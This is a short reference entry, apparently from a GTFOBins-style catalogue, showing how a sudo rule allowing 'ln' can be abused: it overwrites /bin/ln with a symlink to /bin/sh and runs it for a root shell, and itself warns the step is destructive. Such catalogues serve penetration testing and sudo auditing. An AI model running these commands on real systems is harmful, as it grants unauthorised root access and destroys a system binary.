---
type: gtfobin
name: ln
platform: Unix
functions: [privilege-escalation]
tags: [gtfobin, unix, lotl]
---

# ln

## privilege-escalation

```bash
ln -fs /bin/sh /bin/ln
ln
```
_This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action._
**Contexts:** sudo
